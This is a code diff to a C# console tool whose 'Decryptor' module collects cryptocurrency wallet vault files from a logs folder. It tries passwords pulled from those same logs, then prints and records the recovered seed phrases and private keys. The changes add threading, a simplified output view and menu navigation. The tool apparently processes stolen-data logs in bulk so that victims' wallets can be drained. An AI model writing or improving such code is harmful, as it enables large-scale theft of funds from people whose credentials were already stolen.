@@ -4,6 +4,7 @@ using Org.BouncyCastle.Crypto.Generators;
 using Org.BouncyCastle.Crypto.Modes;
 using Org.BouncyCastle.Crypto.Parameters;
 using Pastel;
+using System.Collections.Concurrent;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -113,8 +114,10 @@ public class Decryptor
         return decryptedData;
     }
 
-    public static Structures.Vault.Secret? Decrypt(string path, List<string> passwords)
+    public static Structures.Vault.Secret? Decrypt(string path, List<string> passwords, bool SimplifiedView)
     {
+        var Settings = new Utils.IniFile("Settings.ini");
+        string? RootPath = Settings.Read("Main", "LastPath");
         var EncryptedVaults = GrabVaults(path);
         if (EncryptedVaults is null) return null;
         string? CachedPassword = null;
@@ -141,7 +144,14 @@ public class Decryptor
                     if (Password == passwords[^1])
                     {
                         DateTime TryTime = DateTime.Now;
-                        Console.WriteLine($" [{TryTime:H:mm:ss}]\t{"Path:".Pastel(ConsoleColor.Yellow)} {EncryptedVault.Path}\n\t\t{("Data:".Pastel(ConsoleColor.Yellow))} {EncryptedVault.Data}\n\t\t{("IV:".Pastel(ConsoleColor.Yellow))} {EncryptedVault.IV}\n\t\t{("Salt:".Pastel(ConsoleColor.Yellow))} {EncryptedVault.Salt}\n\t\t{("MSG:".Pastel(ConsoleColor.Yellow))} {("No valid password found".Pastel(ConsoleColor.Red))}\n");
+
+                        if (SimplifiedView is true)
+                        {
+                            Console.WriteLine($" [{TryTime:H:mm:ss}] {Path.GetFileName(path).Pastel(ConsoleColor.Yellow)} => {"No valid password found".Pastel(System.Drawing.Color.OrangeRed)}");
+                        }
+
+                        else
+                            Console.WriteLine($" [{TryTime:H:mm:ss}]\t{"Path:".Pastel(ConsoleColor.Yellow)} {(EncryptedVault.Path is null ? "none" : (EncryptedVault.Path.Length > 70 ? (RootPath is null ? EncryptedVault.Path[..68] + ".." : EncryptedVault.Path.Replace(RootPath, "")[1..]) : EncryptedVault.Path))}\n\t\t{"Data:".Pastel(ConsoleColor.Yellow)} {(EncryptedVault.Data.Length > 70 ? EncryptedVault.Data[..68] + ".." : EncryptedVault.Data)}\n\t\t{"IV:".Pastel(ConsoleColor.Yellow)} {EncryptedVault.IV}\n\t\t{("Salt:".Pastel(ConsoleColor.Yellow))} {EncryptedVault.Salt}\n\t\t{("MSG:".Pastel(ConsoleColor.Yellow))} {"No valid password found".Pastel(ConsoleColor.Red)}\n");
                     }
                 }
 
@@ -187,14 +197,33 @@ public class Decryptor
 
         DateTime CurrentTime = DateTime.Now;
         string OutputTime = $" [{CurrentTime:H:mm:ss}]";
-        string OutputPath = $"{"Path:".Pastel(ConsoleColor.Yellow)} {path}";
+        string OutputPath = $"{"Path:".Pastel(ConsoleColor.Yellow)} {(path is null ? "none" : (path.Length > 70 ? (RootPath is null ? path[..68] + ".." : path.Replace(RootPath, "")[1..]) : path))}";
         string OutputType = $"{"Type:".Pastel(ConsoleColor.Yellow)} {CachedType}";
         string OutputMnemonics = $"{$"Phrases ({Secret.Mnemonics.Count}):".Pastel(ConsoleColor.Yellow)} {(Secret.Mnemonics.Count == 0 ? "None" : string.Join($"\n\t\t\t{string.Concat(Enumerable.Repeat(" ", Secret.Mnemonics.Count.ToString().Length))}    ", Secret.Mnemonics.Select(el => el.Value).ToArray()))}";
         string OutputKeys = $"{$"Keys ({Secret.PrivateKeys.Count}):".Pastel(ConsoleColor.Yellow)} {(Secret.PrivateKeys.Count == 0 ? "None" : string.Join($"\n\t\t\t{string.Concat(Enumerable.Repeat(" ", Secret.PrivateKeys.Count.ToString().Length))} ", Secret.PrivateKeys.Select(el => el.Value).ToArray()))}";
         string OutputMSG = $"{"MSG:".Pastel(ConsoleColor.Yellow)} {$"Success with password {CachedPassword}".Pastel(ConsoleColor.Green)}";
 
-        // Console output
-        Console.WriteLine($"{OutputTime}\t{OutputPath}\n\t\t{OutputType}\n\t\t{OutputMnemonics}\n\t\t{OutputKeys}\n\t\t{OutputMSG}\n");
+        if (SimplifiedView is true)
+        {
+            string outputTimePath = $" [{CurrentTime:H:mm:ss}] {Path.GetFileName(path).Pastel(ConsoleColor.Yellow)} =>";
+            var outputData = new List<string>();
+
+            if (Secret.Mnemonics.Count != 0)
+                outputData.AddRange(Secret.Mnemonics.Select(el => $"{outputTimePath} {el.Value}"));
+
+            if (Secret.PrivateKeys.Count != 0)
+                outputData.AddRange(Secret.PrivateKeys.Select(el => $"{outputTimePath} {el.Value}"));
+
+            if (outputData.Count != 0)
+                Console.WriteLine(string.Join("\n", outputData));
+
+            return Secret;
+        }
+
+        else
+        {
+            Console.WriteLine($"{OutputTime}\t{OutputPath}\n\t\t{OutputType}\n\t\t{OutputMnemonics}\n\t\t{OutputKeys}\n\t\t{OutputMSG}\n");
+        }
 
         return Secret;
     }
@@ -214,49 +243,91 @@ public class Decryptor
 
     public static List<Structures.Vault.Secret> Call(string LogsPath, string ResultsPath, string RecordPath)
     {
+        Console.SetCursorPosition(0, 0);
+        Console.Clear();
+        Program.ShowLogo();
+
         string RecordType = "Decryptor";
         var Secrets = new List<Structures.Vault.Secret>();
-        Console.WriteLine(" # Collecting vault files from paths, be patient...");
+        var Settings = new Utils.IniFile("Settings.ini");
+        string? Threads = Settings.Read("Main", "Threads");
+        bool SimplifiedView = Settings.Read("Output", "SimplifiedView") == "True";
 
+        string Output = $" {"# MAIN MENU > LAUNCH".Pastel(System.Drawing.Color.OrangeRed)}\n\n {"Decryptor is a module for decrypting cryptocurrency wallets ".Pastel(ConsoleColor.Gray)}\n";
+        Console.WriteLine(Output);
+
+        if (Threads is null || Threads == "")
+        {
+            Console.WriteLine(" ! Since the threads have not been configured, the default value will be \"1\"");
+        }
+        Console.WriteLine(" # Collecting vault files from paths was started, please be patient...");
         var CryptoFiles = FindVaultFiles(LogsPath);
 
         if (CryptoFiles is not null)
         {
-            Console.WriteLine(" # Done! Processing...\n");
+            Console.WriteLine(" # Collecting is done! Processing...\n");
+            var Partitions = Partitioner.Create(CryptoFiles).GetPartitions(Threads is null || Threads == "" ? 1 : int.Parse(Threads));
+            var Tasks = new List<Task>();
 
-            Parallel.ForEach(CryptoFiles, File =>
+            foreach (var Partition in Partitions)
             {
-                try
+                var task = Task.Run(() =>
                 {
-                    var Passwords = Utils.FindPasswords(LogsPath, Path.GetDirectoryName(File));
-                    if (Passwords is not null)
+                    while (Partition.MoveNext())
                     {
-                        var Secret = Decrypt(File, Passwords);
-
-                        if (Secret is not null)
+                        try
                         {
-                            if (Secret.Value.Mnemonics.Count != 0 || Secret.Value.PrivateKeys.Count != 0)
+                            var File = Partition.Current;
+                            var Passwords = Utils.FindPasswords(LogsPath, Path.GetDirectoryName(File));
+                            if (Passwords is not null)
                             {
-                                Secrets.Add(Secret.Value);
-                                string RecordFullPath = $"{RecordPath}/{RecordType}";
+                                var Secret = Decrypt(File, Passwords, SimplifiedView);
 
-                                Utils.TryCreateDirectory(ResultsPath);
-                                Utils.TryCreateDirectory(RecordPath);
-                                Utils.TryCreateDirectory(RecordFullPath);
+                                if (Secret is not null)
+                                {
+                                    if (Secret.Value.Mnemonics.Count != 0 || Secret.Value.PrivateKeys.Count != 0)
+                                    {
+                                        Secrets.Add(Secret.Value);
+                                        string RecordFullPath = $"{RecordPath}/{RecordType}";
+                                        new List<string>() { ResultsPath, RecordPath, RecordFullPath }.ForEach(el => Utils.TryCreateDirectory(el));
 
-                                Recorders.Universal.Record(RecordFullPath, Secret.Value);
+                                        Recorders.Universal.Record(RecordFullPath, Secret.Value);
+                                    }
+                                }
                             }
                         }
+                        catch (Exception) { }
                     }
-                }
-                catch (Exception) { }
-            });
-        }
-        else
-        {
-            Console.WriteLine(" ! No any vaults was found :<\n");
+                });
+                Tasks.Add(task);
+            }
+
+            Task.WaitAll(Tasks.ToArray());
         }
 
+        else
+        {
+            Console.WriteLine(" ! No any vaults was found, press ESC to go back\n");
+
+            while (true)
+            {
+                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
+                var KeyName = keyInfo.Key;
+
+                switch (KeyName)
+                {
+                    case ConsoleKey.Escape:
+                        Menu.Main.Show();
+                        return Secrets;
+                    default:
+                        break;
+                }
+            }
+        }
+
+        Console.WriteLine(" # Process ended. Press any key to return to main menu");
+        Console.ReadKey(true);
+        Menu.Main.Show();
         return Secrets;
     }
 }
